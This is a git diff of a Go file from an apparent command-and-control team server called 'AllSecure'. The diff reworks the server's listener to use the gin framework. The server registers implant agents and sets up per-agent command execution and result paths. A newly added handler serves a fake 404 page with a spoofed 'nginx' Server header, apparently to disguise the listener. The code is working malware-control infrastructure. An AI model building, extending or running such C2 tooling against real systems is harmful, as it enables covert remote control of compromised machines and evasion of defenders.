@@ -3,7 +3,7 @@
 	crumb
 */
 
-package main
+package ListeningServer
 
 import (
 	"AllSecure/TeamServer/Crypt"
@@ -11,16 +11,17 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
-	"github.com/gorilla/mux"
+	"github.com/gin-gonic/gin"
+	"io"
 	"log"
-	"net/http"
 	"os"
+
+	"net/http"
 	"strings"
 	"time"
 )
 
 var agent_arr []implant.Agent
-var router *mux.Router
 
 func RecvCmdAll(w http.ResponseWriter, r *http.Request) {
 
@@ -82,24 +83,36 @@ func RecvCmdSingle(w http.ResponseWriter, r *http.Request) {
 
 }
 
-func Register(w http.ResponseWriter, r *http.Request) {
+func (handler *HTTPServer) ProcessRequest(c *gin.Context) {
 
-	err := r.ParseForm()
+	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
 		panic(err)
 	}
-	id := r.PostFormValue("slice_id")
+	defer c.Request.Body.Close()
+	parts := strings.Split(string(body), "=")
+	id := parts[1]
 
 	new_agent := implant.Agent{Id: id}
 	agent_arr = append(agent_arr, new_agent)
 
 	newExecPath := "/" + id + "/ExecCmd"
 	newRecvPath := "/" + id + "/RecvCmd"
-	router.HandleFunc(newExecPath, SendCommandSingle)
-	router.HandleFunc(newRecvPath, RecvCmdSingle)
+	//router.HandleFunc(newExecPath, SendCommandSingle)
+	//router.HandleFunc(newRecvPath, RecvCmdSingle)
 	log.Printf("[+] Registered New Agent at [%s], Cmd Exec Path: %s\n", time.DateTime, newExecPath)
 	log.Printf("[+] Registered New Agent at [%s], Recv Cmd Exec Path: %s\n", time.DateTime, newRecvPath)
 
+}
+func (handler *HTTPServer) DenyRequest(c *gin.Context) {
+	c.Writer.WriteHeader(http.StatusNotFound)
+	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\NotFound.html")
+	if err != nil {
+		log.Println("Could not load not found html file")
+	}
+	c.Header("Server", "nginx")
+	c.Header("Content-Type", "text/html")
+	c.Writer.Write(html)
 }
 
 func InitTLSCerts() string {
@@ -137,27 +150,58 @@ func UpdateHttpServer(Server *http.Server, ClientCertFilePath string) *http.Serv
 	Server = &http.Server{Addr: ":443", TLSConfig: TlsConfig}
 	return Server
 }
+func (handler *HTTPServer) init() {
+	for {
+		handler.Config.Secure = false
+		fmt.Println("[+] Please give me Port to Start Listening Server: i.e. :443")
+		num_items, err := fmt.Scanln(&handler.Config.Port)
+		if err != nil {
+			panic(err)
+		}
+		if num_items > 1 {
+			fmt.Println("[-] Incorrect format please give the port w/ no spaces in this format :443")
+			continue
+		}
+		fmt.Println("[+] Please give me bind address to listen on: i.e. 127.0.0.1")
+		num_items, err = fmt.Scanln(&handler.Config.Address)
+		if err != nil {
+			panic(err)
+		}
+		if num_items > 1 {
+			fmt.Println("[-] Incorrect format please give the address w/ no spaces in this format 127.0.0.1")
+			continue
+		}
+		var yes string
+		fmt.Println("[+] Do you want to use HTTPS: Y/N ?")
+		num_items, err = fmt.Scanln(&yes)
+		if err != nil {
+			panic(err)
+		}
+		if num_items > 1 {
+			fmt.Println("[-] Incorrect format please give the address w/ no spaces in this format 127.0.0.1")
+			continue
+		}
+		if strings.ToLower(yes) == "y" {
+			handler.Config.Secure = true
+		}
+		break
+	}
 
-func main() {
+}
 
-	//implant.GenerateNewImplant()
+func (handler *HTTPServer) Start() {
 
-	var (
-		Server       *http.Server
-		CertFilePath string
-	)
-	CertFilePath = InitTLSCerts()
-	Server = UpdateHttpServer(Server,
-		"C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure"+
-			"\\CreatedImplants\\0446a1a6d4e84294\\CryptoKeys\\pub-0446a1a6d4e84294.pem")
+	handler.init()
+	handler.GinEngine = gin.Default()
+	handler.GinEngine.POST("/*endpoint", handler.ProcessRequest)
+	handler.GinEngine.GET("/*endpoint", handler.DenyRequest)
+	handler.Active = true
+	handler.Server = &http.Server{Addr: handler.Config.Address + handler.Config.Port, Handler: handler.GinEngine}
 
-	router = mux.NewRouter()
-	router.HandleFunc("/ExecCmd", SendCommandAll).Methods(http.MethodPost)
-	router.HandleFunc("/RecvCmd", RecvCmdAll).Methods(http.MethodPost)
-	router.HandleFunc("/RegisterNewSlice", Register).Methods(http.MethodPost)
+	err := handler.Server.ListenAndServe()
+	if err != nil {
+		log.Fatalln("Couldn't start the HTTP interface" + err.Error())
+		handler.Active = false
+	}
 
-	Server.Handler = router
-
-	log.Fatal(Server.ListenAndServeTLS(CertFilePath, strings.Replace(CertFilePath, "pub-", "priv-", -1)))
-	//log.Fatal(http.ListenAndServe(":443", router))
 }
